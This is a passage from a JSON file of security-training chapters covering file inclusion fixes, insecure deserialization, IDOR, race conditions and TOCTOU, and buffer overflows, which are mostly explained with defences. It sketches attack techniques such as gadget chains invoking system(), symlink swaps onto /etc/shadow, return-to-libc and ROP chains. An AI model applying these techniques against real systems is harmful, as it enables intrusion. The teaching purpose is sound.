append.</li>\n</ul>\n<p>Filtering is a losing strategy for the same reason it loses for SQL injection: the surface of valid-looking inputs is enormous and the parser's behaviour is too generous to enumerate.</p>\n<h2 id=\"the-fix\">The fix</h2>\n<ol>\n<li><strong>Don't take filesystem paths from user input.</strong> Map a <em>symbolic identifier</em> to a server-known path:</li>\n</ol>\n<p><code>php\n   $allowed = ['about' =&gt; 'about.php', 'contact' =&gt; 'contact.php'];\n   if (!isset($allowed[$_GET['page']])) die(\"not found\");\n   include(__DIR__ . \"/templates/\" . $allowed[$_GET['page']]);</code></p>\n<p>No traversal possible — the lookup table is the entire universe of allowed values.</p>\n<ol start=\"2\">\n<li>\n<p><strong>If you must construct a path, anchor and canonicalise it.</strong> Resolve <code>realpath()</code>, then check it is <code>startsWith($safeBase)</code>. Reject if not.</p>\n</li>\n<li>\n<p><strong>Disable URL inclusion globally.</strong> PHP: <code>allow_url_include=Off</code>, <code>allow_url_fopen=Off</code> if you can spare it.</p>\n</li>\n<li>\n<p><strong>Reduce the read permissions of the web process.</strong> It does not need to read <code>/etc/shadow</code>, <code>/home/</code>, or production logs. Containerise; use systemd <code>PrivateTmp</code>, <code>ReadOnlyPaths</code>, <code>InaccessiblePaths</code>.</p>\n</li>\n<li>\n<p><strong>Treat any include taking input as a code review hotspot.</strong> <code>grep -r 'include\\|require\\|fread\\|file_get_contents'</code> and audit each call against rule #1.</p>\n</li>\n</ol>\n<h2 id=\"why-this-class-persists\">Why this class persists</h2>\n<p><code>include()</code> and friends exist because dynamic templating is convenient. The vulnerable pattern (build a path from a query parameter) is what almost every PHP tutorial shows in chapter 2. The fix (allow-list lookup) requires <em>intent</em> — the developer has to understand the threat model before they write the code. As long as introductory material teaches the pattern without the warning, file inclusion will keep appearing in production.</p>",
      "tag": "THEORY · CHAPTER"
    },
    {
      "title": "Web — Insecure Deserialization",
      "slug": "web-insecure-deserialization",
      "date": "2026·06·04",
      "tags": [
        "fundamentals",
        "web",
        "deserialization",
        "theory"
      ],
      "desc": "Serialisation turns an in-memory object into a stream of bytes (so it can be saved or transmitted). Deserialisation does the reverse — reads bytes, reconstructs the object. The vulnerability appears when an application deserialises attacker-controlled bytes using a deserialiser…",
      "body": "<h1 id=\"insecure-deserialization\">Insecure Deserialization</h1>\n<p>Serialisation turns an in-memory object into a stream of bytes (so it can be saved or transmitted). Deserialisation does the reverse — reads bytes, reconstructs the object. The vulnerability appears when an application deserialises <strong>attacker-controlled bytes</strong> using a deserialiser that can do more than restore data: it can <em>invoke methods on the reconstructed objects as part of restoring them</em>. Once an attacker controls which class is instantiated and what fields it has, they can chain together side effects that culminate in remote code execution.</p>\n<p>This is one of the highest-impact, lowest-noise vulnerability classes — when it lands, it usually goes straight to RCE without ever touching the application's documented logic.</p>\n<h2 id=\"the-mechanism\">The mechanism</h2>\n<p>A typical session cookie:</p>\n<pre><code>session=Tzo0OiJVc2VyIjozOntzOjI6ImlkIjt...   (base64 of serialised object)\n</code></pre>\n<p>The server deserialises it on every request to restore the user state. If the deserialiser is <em>language-native</em> (PHP <code>unserialize</code>, Python <code>pickle</code>, Ruby <code>Marshal.load</code>, Java <code>ObjectInputStream</code>, .NET <code>BinaryFormatter</code>), it does not just reconstruct fields — it can:</p>\n<ul>\n<li>call constructors,</li>\n<li>invoke \"magic\" lifecycle methods (<code>__wakeup</code>, <code>__destruct</code>, <code>readResolve</code>, <code>readObject</code>),</li>\n<li>traverse object references and call methods on them,</li>\n<li>(Java/.NET) instantiate classes the application never imported, as long as they're on the classpath.</li>\n</ul>\n<p>The attacker's job is to find a sequence of method invocations — a <strong>gadget chain</strong> — that the deserialiser will trigger as it rebuilds the object graph, ending in something useful: a file read, a shell exec, an SSRF, a DB modification.</p>\n<h2 id=\"why-language-native-deserialisers-are-dangerous\">Why language-native deserialisers are dangerous</h2>\n<p>The format is not just \"data\" — it is \"data + which class this is + how it should reconstitute itself\". The application's developer chose what to <em>serialise out</em>, but the deserialiser will reconstruct <em>anything the format describes</em>. If <code>evil_class.__wakeup()</code> runs <code>system($this-&gt;cmd)</code>, supplying a serialised <code>evil_class</code> with <code>cmd = \"id\"</code> runs the command.</p>\n<p>In Java the classic chain is <strong>ysoserial</strong>'s <code>CommonsCollections1</code>: chains together <code>InvokerTransformer</code> and <code>LazyMap</code> to call <code>Runtime.exec()</code> during deserialisation. The vulnerability is <em>Java itself</em> — any application that calls <code>ObjectInputStream.readObject</code> on untrusted bytes is exploitable if the right library is on the classpath.</p>\n<p>In PHP the magic methods <code>__wakeup</code>, <code>__destruct</code>, <code>__toString</code>, and <code>__call</code> are the entry points. Frameworks ship classes that, when combined, give a chain ending in <code>eval</code> or <code>system</code>.</p>\n<h2 id=\"variants-in-the-wild\">Variants in the wild</h2>\n<ul>\n<li><strong>Cookie manipulation.</strong> Session state base64-encoded in the cookie. Change \"user_role\" from \"user\" to \"admin\", re-serialise, re-sign (or no signature at all), profit.</li>\n<li><strong>Cache poisoning.</strong> Memcache/Redis returning serialised blobs to multiple workers. Plant a malicious blob and every consumer instantiates it.</li>\n<li><strong>Message queues.</strong> Workers consuming serialised tasks from a queue. Anyone who can publish to the queue can RCE every worker.</li>\n<li><strong>REST APIs that take XML/YAML.</strong> XML deserialisers (<code>XStream</code>, <code>XMLDecoder</code>) execute the same kind of gadget chains. YAML deserialisers (Python <code>yaml.load</code> without <code>SafeLoader</code>) literally construct arbitrary Python objects from <code>!!python/object/apply</code> tags.</li>\n<li><strong>Stored fields.</strong> Anywhere a serialised object is read from a database without origin validation — for example PHP applications that <code>unserialize()</code> a profile preferences field.</li>\n</ul>\n<h2 id=\"defence\">Defence</h2>\n<p>The hierarchy is the same shape as injection:</p>\n<ol>\n<li><strong>Don't deserialise untrusted data.</strong> The strongest fix. Use a <em>data-only</em> format (JSON, MsgPack) on trust boundaries. JSON's deserialiser produces plain dictionaries and lists — it cannot instantiate arbitrary classes, so there is no gadget chain to find.</li>\n<li><strong>If you must use a language-native serialiser, sign the payload</strong> so the server can verify it produced it. HMAC the bytes before storing/transmitting; verify before deserialising. This converts the bug into \"the secret must not leak\".</li>\n<li><strong>Allow-list which classes may be reconstructed.</strong> Java <code>ObjectInputFilter</code>, Python custom <code>Unpickler.find_class</code>, PHP <code>unserialize($s, ['allowed_classes' =&gt; ['User']])</code>. Default-deny; the attacker can pick any class from your codebase otherwise.</li>\n<li><strong>Audit for known gadget chains.</strong> <code>ysoserial</code> (Java), <code>PHPGGC</code> (PHP), <code>marshalsec</code> — running them against your endpoints during code review finds nearly all classic chains.</li>\n<li><strong>Run the deserialiser with the least possible privilege.</strong> Defence in depth — when an attacker does get RCE through a gadget chain, the impact is at least bounded by the process's permissions.</li>\n</ol>\n<h2 id=\"a-note-on-json\">A note on JSON</h2>\n<p>JSON is not a get-out-of-jail-free card. Some libraries (notably Jackson with default typing enabled, or <code>.NET</code>'s <code>Newtonsoft.Json</code> with <code>TypeNameHandling.All</code>) accept a <code>$type</code> / <code>@type</code> discriminator inside the JSON that names a class to instantiate. That re-introduces the same gadget-chain problem. Disable polymorphic deserialisation unless you absolutely need it, and then use an allow-list.</p>\n<h2 id=\"why-it-is-so-often-missed\">Why it is so often missed</h2>\n<p>Deserialisation runs at the network boundary, <em>before</em> most application code executes. Traditional input validation looks at the <em>meaning</em> of the data — but by the time you can validate a field, the deserialiser has already reconstructed the object graph and triggered any malicious lifecycle. The check needs to happen <em>before</em> <code>readObject</code>, not after.</p>\n<p>OWASP keeps this class in its Top 10 (now under \"Software and Data Integrity Failures\") for the same reason it keeps injection: the structural fix — never deserialise untrusted bytes — is well-known but very easy to violate when the deserialiser is the path of least resistance.</p>",
      "tag": "THEORY · CHAPTER"
    },
    {
      "title": "Web — IDOR & Access Control",
      "slug": "web-idor-access-control",
      "date": "2026·06·04",
      "tags": [
        "fundamentals",
        "web",
        "idor",
        "authorization",
        "theory"
      ],
      "desc": "Most web vulnerabilities are about what input the application accepts. IDOR — Insecure Direct Object Reference — is the opposite: it is about what the application fails to check about who is making a request that contains an otherwise legitimate identifier.",
      "body": "<h1 id=\"idor-access-control\">IDOR &amp; Access Control</h1>\n<p>Most web vulnerabilities are about <em>what input the application accepts</em>. IDOR — Insecure Direct Object Reference — is the opposite: it is about what the application <strong>fails to check</strong> about <em>who</em> is making a request that contains an otherwise legitimate identifier.</p>\n<p>OWASP categorises this under <strong>Broken Access Control</strong>, which has spent multiple cycles as the #1 web risk. The reason is structural: authorisation is <em>implicit</em> in most frameworks (you have to remember to check), while authentication is <em>explicit</em> (the framework wires it into every route).</p>\n<h2 id=\"the-bug-shape\">The bug shape</h2>\n<p>A request:</p>\n<pre><code>GET /api/invoices/4287\nCookie: session=...\n</code></pre>\n<p>Backend handler:</p>\n<pre><code class=\"language-python\">@app.get(&quot;/api/invoices/&lt;id&gt;&quot;)\ndef get_invoice(id):\n    return db.fetch(&quot;SELECT * FROM invoices WHERE id = ?&quot;, id)\n</code></pre>\n<p>There is no check that the <em>current user</em> is allowed to see <em>that invoice</em>. Anyone who is logged in (which is the bar for \"authenticated\") can read every other user's invoice by walking the id space. The reference is <em>direct</em> (a database PK exposed in the URL) and <em>insecure</em> (no per-object authorisation).</p>\n<p>The classic test: change the ID in a request from your own to someone else's and observe whether the server returns their data.</p>\n<h2 id=\"surface-forms\">Surface forms</h2>\n<ul>\n<li><strong>Numeric IDs in URL path or query.</strong> <code>/users/123</code> → <code>/users/124</code>. The simplest variant.</li>\n<li><strong>GUIDs and \"unguessable\" IDs.</strong> Slightly harder to enumerate but not a security control. IDs leak (logs, referer headers, javascript bundles, shared links, CSV exports, autocomplete) — once one is known, the bug works identically. Security through obscurity is not security.</li>\n<li><strong>IDs in request body / form.</strong> <code>POST /transfer { from_account: 1, to: 999 }</code>. Often missed by reviewers focused on URLs.</li>\n<li><strong>IDs in cookies / headers.</strong> <code>X-Account-Id: 42</code> — common in API gateways; trivially editable.</li>\n<li><strong>Base64 / encoded IDs.</strong> A reversible encoding does not make the ID a secret. Decode, increment, re-encode.</li>\n<li><strong>Hashed IDs.</strong> If the hash is unsalted (or the salt is per-application not per-record), rainbow tables / brute-force on the small input space recover the original.</li>\n<li><strong>Mass assignment.</strong> <code>PUT /users/me { is_admin: true }</code> — the backend updates whatever fields the client sends. The bug is on a different field (<code>is_admin</code>) than the route parameter, but it is the same class: trusting the client to send only fields it is allowed to.</li>\n</ul>\n<h2 id=\"mode-of-failure\">Mode of failure</h2>\n<p>There are three places authorisation gets dropped:</p>\n<ol>\n<li><strong>No check at all.</strong> Developer forgot. Discovered by reading the route handler.</li>\n<li><strong>Check is on the <em>wrong</em> property.</strong> \"User must be logged in\" is verified; \"user must own <em>this</em> invoice\" is not. The classic <em>function-level</em> vs <em>object-level</em> gap.</li>\n<li><strong>Check is on the <em>client</em> side.</strong> UI hides the \"delete\" button for non-admins, but the API endpoint accepts anyone. Hide-in-the-UI is a UX choice, not an access control.</li>\n</ol>\n<p>OWASP splits these as <strong>BOLA</strong> (Broken Object Level Authorisation — case 2) and <strong>BFLA</strong> (Broken Function Level Authorisation — case 1/3). The acronyms differ; the class is the same.</p>\n<h2 id=\"why-this-is-so-persistent\">Why this is so persistent</h2>\n<p>Frameworks make authentication ergonomic (one decorator, one middleware, one config block) but authorisation is per-route, per-action, per-object. Every new endpoint is a fresh opportunity to forget. CRUD scaffolding generators almost never wire in object-level checks because they don't know what your ownership model is.</p>\n<p>Add the fact that authorisation bugs are invisible without an active attempt to reach another user's data — automated test suites that hit <code>/api/invoices/123</code> as a single test user pass forever.</p>\n<h2 id=\"defence-the-patterns-that-scale\">Defence // the patterns that scale</h2>\n<h3 id=\"1-centralise-authorisation-policy\">1. Centralise authorisation policy</h3>\n<p>Don't sprinkle <code>if user.id == invoice.owner_id</code> across handlers. Express ownership as a policy:</p>\n<pre><code>policy.can(user, &quot;read&quot;, invoice) → bool\n</code></pre>\n<p>Policy lives in one module. Every handler calls <code>authorise(user, action, object)</code>. Reviewers grep for the call. Missing calls are visible.</p>\n<h3 id=\"2-tie-the-query-to-the-user\">2. Tie the query to the user</h3>\n<p>Rather than check ownership <em>after</em> fetching:</p>\n<pre><code class=\"language-python\"># vulnerable: fetch, then check (or worse, forget to check)\ninv = db.fetch(&quot;SELECT * FROM invoices WHERE id = ?&quot;, id)\nif inv.owner_id != user.id: abort(403)\n</code></pre>\n<p>Bind the user into the query so it cannot return another user's row:</p>\n<pre><code class=\"language-python\">inv = db.fetch(&quot;SELECT * FROM invoices WHERE id = ? AND owner_id = ?&quot;, id, user.id)\nif not inv: abort(404)\n</code></pre>\n<p>This is sometimes called <em>predicate-based authorisation</em>. The database enforces the rule; the handler cannot accidentally skip it. PostgreSQL's Row-Level Security is the strongest version of this idea: the rule is on the <em>table</em>, no application code can bypass it.</p>\n<h3 id=\"3-dont-expose-internal-ids\">3. Don't expose internal IDs</h3>\n<p>Use opaque per-user identifiers that only resolve for the holder, or scope routes to the user:</p>\n<pre><code>/me/invoices/4287    # resolves to *my* invoice #4287, or 404\n</code></pre>\n<p>Removes the entire \"guess the URL\" attack surface.</p>\n<h3 id=\"4-allow-list-mutable-fields\">4. Allow-list mutable fields</h3>\n<p>For mass-assignment, declare the set of fields the user may update; reject everything else. Don't trust the client to omit <code>is_admin</code> from the body — refuse the body if it contains anything outside the allow-list.</p>\n<h3 id=\"5-test-authorisation-explicitly\">5. Test authorisation explicitly</h3>\n<p>Every endpoint that takes an object ID gets two tests:</p>\n<ul>\n<li>as the owner → 200</li>\n<li>as a different authenticated user → 404 (not 403, to avoid leaking the existence of the object)</li>\n</ul>\n<p>Without this test you cannot say authorisation is enforced, you can only say nobody has noticed it isn't.</p>\n<h2 id=\"a-final-caution\">A final caution</h2>\n<p>IDOR rarely shows up in CVE feeds because it is application-specific: there's no library to fix, no patch to ship. It is found by humans reading code or by attackers walking your URL space. The cost of preventing it (one policy module, one query pattern) is small. The cost of having it (every customer's data, instantly enumerable) is total.</p>",
      "tag": "THEORY · CHAPTER"
    },
    {
      "title": "Race Conditions & TOCTOU",
      "slug": "race-conditions-toctou",
      "date": "2026·06·04",
      "tags": [
        "fundamentals",
        "web",
        "race-condition",
        "toctou",
        "concurrency",
        "theory"
      ],
      "desc": "A race condition is what happens when the correctness of a system depends on the order of events and that order is not guaranteed. TOCTOU — Time Of Check to Time Of Use — is the canonical pattern: the program checks a condition, then later uses the resource on the assumption…",
      "body": "<h1 id=\"race-conditions-toctou\">Race Conditions &amp; TOCTOU</h1>\n<p>A race condition is what happens when the correctness of a system depends on the <em>order</em> of events and that order is not guaranteed. <strong>TOCTOU</strong> — Time Of Check to Time Of Use — is the canonical pattern: the program checks a condition, then <em>later</em> uses the resource on the assumption the condition still holds, when in fact an attacker has changed the world in between.</p>\n<p>Race conditions show up in two main places — the filesystem (classic Unix TOCTOU) and the web (HTTP-level races). The mechanism is identical; only the timing scale changes (microseconds for files, milliseconds for HTTP).</p>\n<h2 id=\"the-toctou-pattern-in-code\">The TOCTOU pattern in code</h2>\n<pre><code class=\"language-c\">if (access(file, R_OK) == 0) {        // ← time of check\n    fd = open(file, O_RDONLY);        // ← time of use\n    read(fd, buffer, ...);\n}\n</code></pre>\n<p>The intent is \"check the user can read the file, then read it\". The bug is that between the <code>access()</code> and the <code>open()</code>, an attacker who controls the directory the file lives in can <code>unlink(file)</code> and re-create it as a symlink pointing at <code>/etc/shadow</code>. The <code>access()</code> check ran against the original benign file; the <code>open()</code> resolves the symlink and opens the privileged target.</p>\n<p>The general shape:</p>\n<pre><code>check(X)        ← assertion about state of X\n       ⋮         ← attacker mutates X\nuse(X)          ← acts on what is now a different X\n</code></pre>\n<p>Anything between the check and the use that lets the attacker run code in the meantime — another process, a parallel HTTP request, an <code>inotify</code> watcher, a tight loop — wins the race.</p>\n<h2 id=\"filesystem-toctou\">Filesystem TOCTOU</h2>\n<p>The classic on Unix:</p>\n<ul>\n<li><strong>Symlink swap.</strong> Drop a file in <code>/tmp</code>, wait for the privileged process to <code>stat()</code> it, swap it for a symlink to a sensitive target before the process opens it.</li>\n<li><strong>Race on <code>chmod</code>/<code>chown</code>.</strong> A SUID program creates a file, then later sets its permissions. Between the two operations, the attacker hardlinks the path to a sensitive file.</li>\n<li><strong>Race on temporary files.</strong> Predictable names (<code>/tmp/xyz.tmp</code>) + slow operations + insufficient <code>O_EXCL | O_NOFOLLOW</code> flags = the attacker wins by creating the file first as a symlink.</li>\n<li><strong>chdir races.</strong> Operations under <code>/tmp/X/sub/file</code> where the attacker can rename <code>/tmp/X</code> between operations.</li>\n</ul>\n<p>The fix is <strong>atomic operations</strong>:</p>\n<ul>\n<li>Use <code>openat()</code> with <code>O_NOFOLLOW</code> to refuse to follow symlinks at the open step.</li>\n<li>Use <code>O_EXCL</code> when creating files (<code>open</code> fails if the file already exists).</li>\n<li>Open the directory once, then operate via the file descriptor only (<code>*at()</code> family).</li>\n<li>Use <code>lstat()</code> for inspection (does not follow symlinks).</li>\n<li>Use <strong>operate-then-check</strong>: open the file, then <code>fstat()</code> the file descriptor to validate properties; you are now describing the same object the kernel opened, not a name that can be re-pointed.</li>\n</ul>\n<p>The Rust standard library, modern Java NIO, and Python's <code>os.open(..., os.O_NOFOLLOW)</code> all expose primitives that make TOCTOU-resistant code straightforward — but you have to know to ask.</p>\n<h2 id=\"web-race-conditions\">Web race conditions</h2>\n<p>The web analogue: two requests arrive <em>almost simultaneously</em>, both pass a check that should have admitted only one, and both proceed to commit the action.</p>\n<h3 id=\"the-classic-double-spend\">The classic \"double-spend\"</h3>\n<pre><code class=\"language-python\">def redeem_coupon(user, code):\n    coupon = db.fetch_one(&quot;SELECT * FROM coupons WHERE code=? AND used=0&quot;, code)\n    if not coupon:\n        return &quot;already used&quot;\n    apply_discount(user, coupon.value)\n    db.execute(&quot;UPDATE coupons SET used=1 WHERE code=?&quot;, code)\n</code></pre>\n<p>Two requests with the same <code>code</code> arrive within milliseconds. Both <code>SELECT</code> the still-<code>used=0</code> row. Both apply the discount. Both <code>UPDATE used=1</code>. The application returns success twice; the discount has been applied twice for the price of one.</p>\n<p>Real-world equivalents:</p>\n<ul>\n<li><strong>Account-balance withdrawal</strong> without a database-side check → over-draft to negative.</li>\n<li><strong>MFA enrolment</strong> — race between \"verify code\" and \"consume code\" → token reusable.</li>\n<li><strong>Voucher/gift card redemption</strong> → infinite discounts.</li>\n<li><strong>Rate-limit bypass</strong> — N parallel requests all pass the \"have you made fewer than 10 requests this minute?\" check.</li>\n<li><strong>Password reset token consumption</strong> — two parallel resets, both succeed, the attacker pins their reset against a stale token still in flight.</li>\n<li><strong>Email verification</strong> — race between \"send verification\" and \"lock account state\".</li>\n<li><strong>Unique constraint races</strong> — application checks \"no user with this name exists\" then creates the user; two parallel requests both create.</li>\n</ul>\n<h3 id=\"single-packet-attack\">Single-packet attack</h3>\n<p>PortSwigger's <strong>single-packet attack</strong> (and Turbo Intruder's earlier last-byte-sync technique) reduces the timing window for HTTP races to <em>literally a single round trip</em>. The attacker pre-sends most of N HTTP/2 requests withholding the final frame, then releases all final frames in one TCP packet. The server receives all N requests within ~1ms. This neutralises most timing-based defences and exposes race conditions previously thought to be too narrow to win.</p>\n<h3 id=\"why-check-then-update-loses\">Why \"check then update\" loses</h3>\n<p>The application-level check (<code>SELECT</code>) runs against the database's current state, but the database does not hold the row locked. Between the check and the update, <em>another transaction is allowed to see the same row</em>. ANSI SQL isolation levels are about <em>what other transactions can observe in your transaction's view</em>, not about <em>exclusive access</em>.</p>\n<h2 id=\"defences-for-web-races\">Defences for web races</h2>\n<p>In order of effectiveness:</p>\n<h3 id=\"1-atomic-database-operations\">1. Atomic database operations</h3>\n<p>Push the check and the update into the same statement so they cannot interleave:</p>\n<pre><code class=\"language-sql\">-- Idempotent: a second concurrent call updates zero rows.\nUPDATE coupons SET used = 1 WHERE code = ? AND used = 0;\n-- If rowcount == 0, the coupon was already used.\n</code></pre>\n<p>If <code>UPDATE</code> returns 0 affected rows, <em>some other transaction already won the race</em>. No coupon was double-spent — the second request can be told \"already used\" honestly.</p>\n<h3 id=\"2-database-side-uniqueness\">2. Database-side uniqueness</h3>\n<p>Express the invariant as a <code>UNIQUE</code> constraint. The database rejects the duplicate at commit time even if both transactions thought they were valid. Catch the constraint violation, return the appropriate error. The DB engine is the lock, not your application code.</p>\n<h3 id=\"3-pessimistic-locking-select-for-update\">3. Pessimistic locking // <code>SELECT ... FOR UPDATE</code></h3>\n<p>Take an explicit row lock before the read so the second transaction blocks:</p>\n<pre><code class=\"language-sql\">BEGIN;\nSELECT used FROM coupons WHERE code = ? FOR UPDATE;\n-- second transaction blocks here until this commits\nUPDATE coupons SET used = 1 WHERE code = ?;\nCOMMIT;\n</code></pre>\n<p>Heavier than option 1 but works when the logic doesn't reduce to a single statement.</p>\n<h3 id=\"4-optimistic-concurrency-version-columns\">4. Optimistic concurrency // version columns</h3>\n<p>Each row has a <code>version</code> integer. Updates include <code>AND version = ?</code> and increment it. A second concurrent update finds <code>version</code> has already moved, fails, and retries.</p>\n<pre><code class=\"language-sql\">UPDATE accounts SET balance = balance - 100, version = version + 1\n  WHERE id = ? AND version = 3 AND balance &gt;= 100;\n</code></pre>\n<p>Excellent for read-heavy workloads; the conflict is detected at write time.</p>\n<h3 id=\"5-idempotency-keys\">5. Idempotency keys</h3>\n<p>The client sends a unique key per logical operation. The server stores the result keyed by that key on first execution; subsequent requests with the same key return the <em>stored</em> result without re-executing. The Stripe API is the canonical example. Defeats double-submit by design.</p>\n<h3 id=\"6-application-level-mutexes\">6. Application-level mutexes</h3>\n<p>A Redis <code>SETNX</code> with TTL or a database advisory lock around the critical region. Use sparingly — distributed locks have their own correctness pitfalls (the famous \"Redlock\" debate). Prefer atomic DB operations when possible.</p>\n<h2 id=\"what-does-not-work\">What does <em>not</em> work</h2>\n<ul>\n<li><strong>Front-end disabling the button after first click.</strong> The attacker is not using your front end.</li>\n<li><strong>Rate limiting per second.</strong> A race window of 50ms passes ten requests under any limit set per second.</li>\n<li><strong>CAPTCHA on the form.</strong> Solved once, replayed in parallel.</li>\n<li><strong>A small <code>sleep()</code> after the check.</strong> Just widens the timing window in the attacker's favour.</li>\n</ul>\n<h2 id=\"the-mindset\">The mindset</h2>\n<p>Race conditions are <em>invisible</em> in normal testing because functional tests run sequentially. You will not find them with a checklist; you find them by <em>asking</em> \"if this happened twice at the same time, what would break?\" of every state-changing action. Tools (Turbo Intruder for HTTP, Helgrind for native code, ThreadSanitizer for C/C++, Go's <code>-race</code> flag) make finding them mechanical <em>once you know to look</em>.</p>\n<p>The structural fix is to design the critical section so the database — not the application — owns the consistency guarantee. Once that is true, the application is allowed to be wrong about its concurrent assumptions, because the database will refuse the inconsistent commit.</p>",
      "tag": "THEORY · CHAPTER"
    },
    {
      "title": "Buffer Overflow & Memory Corruption",
      "slug": "buffer-overflow-memory-corruption",
      "date": "2026·06·04",
      "tags": [
        "fundamentals",
        "binary",
        "exploitation",
        "theory"
      ],
      "desc": "A buffer overflow is what happens when a program writes more data into a fixed-size memory region than the region can hold. The excess bytes spill into adjacent memory — corrupting whatever data structure happens to live there. In a high-level language with bounds checking…",
      "body": "<h1 id=\"buffer-overflow-memory-corruption\">Buffer Overflow &amp; Memory Corruption</h1>\n<p>A buffer overflow is what happens when a program writes more data into a fixed-size memory region than the region can hold. The excess bytes spill into adjacent memory — corrupting whatever data structure happens to live there. In a high-level language with bounds checking (Java, Python, Go, Rust) this raises an exception. In C and C++ the spill is silently allowed; the consequences depend entirely on what gets overwritten.</p>\n<p>In offensive security this matters because <em>control data</em> — return addresses, function pointers, virtual table pointers — sits in predictable places relative to user-controllable buffers. Overwriting it lets the attacker redirect the program's execution.</p>\n<h2 id=\"the-stack-frame\">The stack frame</h2>\n<p>When a function is called, a <em>stack frame</em> is pushed:</p>\n<pre><code>high addresses\n+---------------------+\n| caller's stack ...  |\n+---------------------+\n| function arguments  |\n+---------------------+\n| return address      |  ← where to jump back to when this function returns\n+---------------------+\n| saved frame pointer |\n+---------------------+\n| local variables     |  ← including the vulnerable buffer\n| (grows downward)    |\n+---------------------+\nlow addresses\n</code></pre>\n<p>Local variables grow <em>downward</em>, but writes into a buffer (<code>strcpy(buf, input)</code>) go <em>upward</em>. If the input is longer than <code>buf</code>, the write keeps going up through the saved frame pointer, into the <strong>return address</strong>, and beyond. When the function executes <code>ret</code>, the CPU pops what it believes is the return address and jumps there — except the attacker has just written that value.</p>\n<h2 id=\"the-classic-exploit-pre-mitigations\">The classic exploit (pre-mitigations)</h2>\n<ol>\n<li>Find an overflow: a <code>strcpy</code>/<code>gets</code>/<code>memcpy</code> whose source size is attacker-controlled.</li>\n<li>Determine the offset from the start of the buffer to the return address (cyclic patterns make this fast).</li>\n<li>Write <code>[ padding ][ &amp;shellcode ][ shellcode ]</code> into the buffer.</li>\n<li>The buffer overflows; the return address is overwritten with the address of the shellcode bytes themselves; on <code>ret</code> the CPU starts executing your shellcode.</li>\n</ol>\n<p>That was the <em>whole</em> exploit on 32-bit systems with no protections. It still works on poorly-protected embedded targets, IoT firmware, and CTF challenges that intentionally disable mitigations.</p>\n<h2 id=\"modern-mitigations-and-how-exploitation-evolved\">Modern mitigations // and how exploitation evolved</h2>\n<p>Each mitigation closes one door; exploit primitives evolved to find the next.</p>\n<h3 id=\"nx-dep-no-execute\">NX / DEP // No Execute</h3>\n<p>Mark the stack (and heap) non-executable. Now even if you can jump to shellcode you placed in the buffer, the CPU refuses to execute data pages.</p>\n<p>The attacker's response: <strong>return-to-libc</strong>. Instead of jumping into shellcode you injected, point the return address at an existing function (<code>system()</code>) and arrange for its argument (<code>/bin/sh</code>) to be the next thing on the stack.</p>\n<h3 id=\"aslr-address-space-layout-randomisation\">ASLR // Address Space Layout Randomisation</h3>\n<p>Randomise the base address of the stack, heap, and shared libraries on every run. <code>system()</code> is no longer at a predictable address.</p>\n<p>The attacker's response: <strong>leak an address first</strong>. Find a <em>format-string</em> bug, a <em>use-after-free</em> that returns a pointer, or any other primitive that discloses one address in the loaded library. From that one leak, all other library addresses are computable (the offsets within the library are fixed).</p>\n<h3 id=\"stack-canaries-stackguard\">Stack canaries (StackGuard)</h3>\n<p>The compiler inserts a random value (the <em>canary</em>) between the local variables and the saved return address. Before returning, the function checks the canary; if it has been overwritten the program aborts.</p>\n<p>Attacker response: <strong>leak the canary</strong> (same primitive as for ASLR leaks), or find an overflow that <em>skips</em> the canary (e.g. writes via a pointer rather than linearly).</p>\n<h3 id=\"pie-position-independent-executable\">PIE // Position Independent Executable</h3>\n<p>Randomise the main binary's base address too (ASLR already covered libraries). Now even leaked library pointers don't disclose program addresses.</p>\n<h3 id=\"relro\">RELRO</h3>\n<p>Mark the GOT (Global Offset Table — used for resolving library function calls at runtime) read-only after the loader finishes. Prevents the classic \"overwrite a GOT entry to redirect <code>printf</code> to <code>system</code>\" trick.</p>\n<h3 id=\"cfi-control-flow-integrity\">CFI // Control Flow Integrity</h3>\n<p>Compiler-inserted checks that indirect calls (function pointers, vtables) target only addresses the compiler proved were valid call sites. Defeats many ROP-chain primitives by refusing to honour the corrupted pointer in the first place.</p>\n<h2 id=\"rop-return-oriented-programming\">ROP // Return-Oriented Programming</h2>\n<p>With NX defeating shellcode and ASLR defeating fixed addresses, attackers turned to <strong>gadgets</strong>: short sequences of legitimate code in the program or its libraries that end in <code>ret</code>. By overwriting the stack with a <em>chain</em> of addresses, each pointing at a useful gadget, the attacker builds an arbitrary program out of existing code:</p>\n<pre><code>pop rdi   ;  ret    →  pops the next stack value into rdi\npop rsi   ;  ret    →  pops the next into rsi\nsyscall   ;  ret    →  invokes the syscall\n\nstack:    [&amp;pop_rdi] [arg1] [&amp;pop_rsi] [arg2] [&amp;syscall] ...\n</code></pre>\n<p>No code was injected. Every byte executed was already in the binary, signed and trusted. ROP is what made \"data execution prevention\" — the original mitigation — moot.</p>\n<h2 id=\"heap-overflows-and-use-after-free\">Heap overflows and use-after-free</h2>\n<p>The same idea, but the corrupted region is on the heap. Modern allocators (glibc's tcache, ptmalloc) keep metadata <em>inline</em> with free chunks; overwriting a freed chunk's <code>fd</code> pointer lets the attacker influence where the next allocation lands — eventually returning a pointer the attacker controls into the application's own data structures. Use-after-free exploits free an object, let the allocator reuse the slot for an attacker-shaped object, then trigger a method call through the original (dangling) pointer — invoking attacker-controlled function pointers / vtables.</p>\n<h2 id=\"the-language-fix\">The language fix</h2>\n<p>C and C++ make manual memory management the developer's job. Decades of vulnerabilities show this is not a job humans do reliably. <strong>Memory-safe languages</strong> (Rust, Go, Swift, modern Java, .NET) prevent the entire class by checking bounds, owning references, and disallowing dangling pointers. The CISA, NSA, and major OS vendors now publicly recommend rewriting memory-unsafe critical components in memory-safe languages — not because C is unfixable, but because the cost of vigilance has been demonstrated to exceed the cost of migration.</p>\n<p>The mitigations above are useful — they buy decades of life for existing C code — but they are a <em>tax</em> on exploitation, not a fix. The fix is at the language level.</p>",
      "tag": "THEORY · CHAPTER"
    },
    {
      "title": "Linux Privilege Escalation — Theory",
      "slug": "linux-privilege-escalation-theory",
      "date": "2026·06·04",
      "tags": [
        "fundamentals",
        "linux",
        "privesc",
        "theory"
      ],
      "desc": "You start with shell access as an unprivileged user — www-data, tomcat, some application account. The goal is to become root. Linux privilege escalation is the study of all the legitimate mechanisms by which the kernel will let one user act as another, and the misconfigurations…",
